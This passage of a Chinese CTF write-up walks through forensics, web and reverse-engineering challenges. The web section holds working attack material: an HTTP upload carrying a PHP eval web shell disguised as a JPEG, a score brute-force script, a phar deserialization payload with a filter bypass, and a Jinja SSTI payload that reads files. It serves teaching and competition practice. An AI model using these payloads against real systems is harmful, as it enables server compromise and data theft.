0x000000000aa03000 2019-08-17 07:21:33 UTC+0000</span><br><span class="line">0x000000000d9a57d0 vmtoolsd.exe       1296    420 0x000000000e2bc000 2019-08-17 07:21:24 UTC+0000</span><br><span class="line">0x000000000ec16c20 vssvc.exe          2108    420 0x000000000693a000 2019-08-17 07:21:33 UTC+0000</span><br><span class="line">0x000000000ec3c580 lsass.exe           432    372 0x0000000008701000 2019-08-17 07:21:06 UTC+0000</span><br></pre></td></tr></table></figure><p>其中比较可疑的是<code>pythonw.exe</code>进程，把这个进程的内存dump下来，然后尝试用关键字过滤，最后可以找到一个python脚本。内存很大，出题人说用winhex搜索就行了，我用的是strings。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f 2.data --profile=WinXPSP1x64 memdump -D /tmp/ -p 2364</span><br></pre></td></tr></table></figure></p><p>加密脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="comment"># flag&#123; this is not flag, it's just a comment in python source file.I hide some secret with python, I don't think you can found it.</span></span><br><span class="line">secret_file_name = <span class="string">'flag.txt'</span></span><br><span class="line">secret_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), secret_file_name)</span><br><span class="line">secret = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(secret_file_path, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line">os.remove(secret_file_path)</span><br><span class="line">key = input(<span class="string">"Set a value 0x00 &lt; key &lt; 0xff:"</span>)</span><br><span class="line">key = int(key[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(content, key)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        result += chr(ord(c) ^ key)</span><br><span class="line">    <span class="keyword">return</span> b64encode(result.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    secret = encrypt(secret, key)</span><br><span class="line">    <span class="keyword">if</span> type(secret) != <span class="string">'str'</span>:</span><br><span class="line">        secret = secret.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">result_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), <span class="string">'lalala.secret'</span>)</span><br><span class="line"><span class="keyword">with</span> open(result_path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(secret)</span><br><span class="line">os.remove(os.path.abspath(__file__))</span><br></pre></td></tr></table></figure></p><p>在<code>\Device\HarddiskVolume1\Documents and Settings\Administrator\桌面</code>找到加密后的文件<code>lalala.secret</code>，内存搜索一大串base64也可以，加密字符串特征比较明显。听说有大神找base64字符串，直接脑补了加密算法，我只能说刚刚NB。</p><p>直接爆破key即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">'c1IufV1PRUZOX1VtTyYiIE9BRXJxeyZSWyRVc0MmIiJPQS52cU9FUkN6XXVyQlJ7c1JFQHJBI3xGeWNzcXtnL3QkZyNccCoq=='</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(content, key)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    content = b64decode(content).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        result += chr(ord(c) ^ key)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m2 = decrypt(m,i)</span><br><span class="line">        m3 = decrypt(m2,i)</span><br><span class="line">        flag = decrypt(m3,i)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-简单渗透"><a href="#web1-简单渗透" class="headerlink" title="web1 简单渗透"></a>web1 简单渗透</h3><p>扫描目录发现<code>backup.zip</code>，根据zip内容修改hosts，使用提示给的账号密码访问后台，后台存在文件上传，修改<code>Content-Type</code>为<code>image/jpeg</code>即可传php。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /user/upload.html HTTP/1.1</span><br><span class="line">Host: admin.blogdemo2.com</span><br><span class="line">Content-Length: 415</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://admin.blogdemo2.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeB2UUeqAwLr2uKY1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://admin.blogdemo2.com/user/upload.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8</span><br><span class="line">Cookie: _adminCSRF=3e0552599661ff4611ef79136f2b18cfcc7c3d191d7a61814ba0bcf79f526234a%3A2%3A%7Bi%3A0%3Bs%3A10%3A%22_adminCSRF%22%3Bi%3A1%3Bs%3A32%3A%22swDNSQwqnTeYymLVfcfZ2RbqL9oNilNu%22%3B%7D; PHPBACKSESSION=r7f12vcl3nga9lijjmi9a3nfn0; _identity=2ee88609ab19408b884b602fe183b26b1737b78b2f7e765bb971b50fe8734f55a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22pG7TRyTIXlEbcenpi34TzmMYS2zDsMTF%22%2C2592000%5D%22%3B%7D</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeB2UUeqAwLr2uKY1</span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryeB2UUeqAwLr2uKY1</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;123.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[c]);?&gt;</span><br><span class="line">------WebKitFormBoundaryeB2UUeqAwLr2uKY1</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">------WebKitFormBoundaryeB2UUeqAwLr2uKY1--</span><br></pre></td></tr></table></figure><h3 id="web2-澳门赌场"><a href="#web2-澳门赌场" class="headerlink" title="web2 澳门赌场"></a>web2 澳门赌场</h3><p>查看源码或者抓包，可以看到post分数的包，直接爆破4位分数。当时不会用burp，直接写了个py脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> hashlib.md5(x).hexdigest()</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">number = str(i).rjust(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">sign = md5(number)</span><br><span class="line"><span class="comment">#print number</span></span><br><span class="line">paramsPost = &#123;<span class="string">"sign"</span>:sign,<span class="string">"number"</span>:number&#125;</span><br><span class="line">response = session.post(<span class="string">"http://10.55.2.50/result.php"</span>, data=paramsPost)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Bad Luck"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.content:</span><br><span class="line">print(<span class="string">"Status code:   %i"</span> % response.status_code)</span><br><span class="line">print(<span class="string">"Response body: %s"</span> % response.content)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web3-treehole"><a href="#web3-treehole" class="headerlink" title="web3 treehole"></a>web3 treehole</h3><p>扫描发现<code>index.php.bak</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//图片展示</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowPic</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $pic_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pic_path=$path;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_pic</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;pic_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;get_pic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//我没有用include，用的是file_get_content，不会有漏洞的</span></span><br></pre></td></tr></table></figure></p><p>尝试上传图片，测试发现基本没限制，只要扩展名和文件类型正确即可。而留言的地方有<code>path</code>参数，测试发现如果文件已存在会提示，那么<del>大胆</del>猜测存在<code>file_exists</code>这个函数，这个函数可以触发phar反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowPic</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $pic_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pic_path=$path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ShowPic(<span class="string">'/var/www/html/class.php'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>生成一个phar用图片上传，然后在留言处触发反序列化。</p><p><img src="http://md.36huo.com/uploads/upload_f03f4f66d6e1f67e10bbc5e520021e3f.png" alt=""></p><p>万恶的出题人过滤了phar，可以加compress.zlib://绕过</p><p><img src="http://md.36huo.com/uploads/upload_8342b9d161282db5202f5096eea2d1c4.png" alt=""></p><p>flag在<code>/flag</code></p><p>尝试读取各个文件源码，看看是否有getshell可能性。</p><p><strong>class.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">create_treehole</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $realpath = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $complaint = <span class="string">""</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path,$complaint)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;complaint = $complaint;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;realpath = <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">()</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;realpath = <span class="keyword">$this</span>-&gt;create_name($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">           file_put_contents(<span class="keyword">$this</span>-&gt;realpath, <span class="keyword">$this</span>-&gt;complaint);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">back</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"您的烦恼保存在了 "</span>.<span class="keyword">$this</span>-&gt;realpath.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">create_name</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $salt=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++)&#123;</span><br><span class="line">            $salt .= chr(mt_rand(<span class="number">33</span>,<span class="number">126</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        $str = <span class="string">"./treehole/"</span>.md5($str.$salt).<span class="string">".txt"</span>;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowPic</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $pic_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pic_path=$path;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_pic</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;pic_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;get_pic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>complaint.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"class.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"complaint"</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">"path"</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/^phar|php|zip|data/i"</span>, $_POST[<span class="string">"path"</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"detect hacker!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(file_get_contents($_POST[<span class="string">"path"</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"exists"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $treehole = <span class="keyword">new</span> create_treehole($_POST[<span class="string">"path"</span>], $_POST[<span class="string">"complaint"</span>]);</span><br><span class="line">        $treehole-&gt;make();</span><br><span class="line">$treehole-&gt;back();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>原来是file_get_contents，猜错了。。。</p><p><strong>upload.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$whitelist=[<span class="string">'.jpg'</span>,<span class="string">'.png'</span>];</span><br><span class="line">$file=$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>($_FILES) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!in_array(substr($file, <span class="number">-4</span>), $whitelist)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"文件后缀必须是.jpg或.png"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"pic/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"pic/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"无文件被上传"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>想不到办法getshell，有思路欢迎找我讨论。</p><h3 id="web4-ssti"><a href="#web4-ssti" class="headerlink" title="web4 ssti"></a>web4 ssti</h3><p>过滤了<code>[]</code>，使用<code>__getitem__</code>绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)(&apos;/flag&apos;).read()</span><br></pre></td></tr></table></figure></p><p>时间有限，拿了flag就跑，没时间读源码。</p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="基本能力"><a href="#基本能力" class="headerlink" title="基本能力"></a>基本能力</h3><p>题目提供c代码以及<code>func</code>函数的汇编码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[] = &#123;<span class="number">0x0</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x7e</span>,<span class="number">0x41</span>,<span class="number">0x4b</span>,<span class="number">0x3b</span>,<span class="number">0x4c</span>,<span class="number">0x7e</span>,<span class="number">0x51</span>,<span class="number">0x5c</span>,<span class="number">0x49</span>,<span class="number">0x62</span>,<span class="number">0x77</span>,<span class="number">0x78</span>,<span class="number">0x62</span>,<span class="number">0x79</span>,<span class="number">0x51</span>,<span class="number">0x79</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x2e</span>,<span class="number">0x2e</span>,<span class="number">0x70</span>,<span class="number">0x48</span>,<span class="number">0x66</span>,<span class="number">0x1c</span>&#125;;</span><br><span class="line">  func(input, <span class="number">28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>,input+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00000000004004e6 &lt;func&gt;:</span><br><span class="line">55                    push   rbp</span><br><span class="line">48 89 e5              mov    rbp,rsp</span><br><span class="line">48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line">89 75 e4              mov    DWORD PTR [rbp-0x1c],esi</span><br><span class="line">c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1</span><br><span class="line">eb 28                 jmp    400522 &lt;func+0x3c&gt;</span><br><span class="line">8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">48 63 d0              movsxd rdx,eax</span><br><span class="line">48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">48 01 d0              add    rax,rdx</span><br><span class="line">8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">48 63 ca              movsxd rcx,edx</span><br><span class="line">48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]</span><br><span class="line">48 01 ca              add    rdx,rcx</span><br><span class="line">0f b6 0a              movzx  ecx,BYTE PTR [rdx]</span><br><span class="line">8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">31 ca                 xor    edx,ecx</span><br><span class="line">88 10                 mov    BYTE PTR [rax],dl</span><br><span class="line">83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1</span><br><span class="line">8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]</span><br><span class="line">7e d0                 jle    4004fa &lt;func+0x14&gt;</span><br><span class="line">90                    nop</span><br><span class="line">5d                    pop    rbp</span><br><span class="line">c3                    ret</span><br></pre></td></tr></table></figure><p>加密函数的逻辑不是很复杂，是一个xor加密<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; len(flag); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    flag[i] ^= i;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> flag;</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[<span class="number">0x0</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x7e</span>,<span class="number">0x41</span>,<span class="number">0x4b</span>,<span class="number">0x3b</span>,<span class="number">0x4c</span>,<span class="number">0x7e</span>,<span class="number">0x51</span>,<span class="number">0x5c</span>,<span class="number">0x49</span>,<span class="number">0x62</span>,<span class="number">0x77</span>,<span class="number">0x78</span>,<span class="number">0x62</span>,<span class="number">0x79</span>,<span class="number">0x51</span>,<span class="number">0x79</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x2e</span>,<span class="number">0x2e</span>,<span class="number">0x70</span>,<span class="number">0x48</span>,<span class="number">0x66</span>,<span class="number">0x1c</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.join([chr(a[i]^i) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))])</span><br><span class="line"><span class="string">'\x00flag&#123;GL3EtZPDlxhskBmec96iR&#125;\x00'</span></span><br></pre></td></tr></table></figure><h3 id="gameapp"><a href="#gameapp" class="headerlink" title="gameapp"></a>gameapp</h3><p>app是一个打飞机的游戏，需要获得99999分，通过burp抓包，可以发现app加分的操作是通过http包发给远程服务器，数据使用RSA进行了加密。用JEB可以看到具体的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 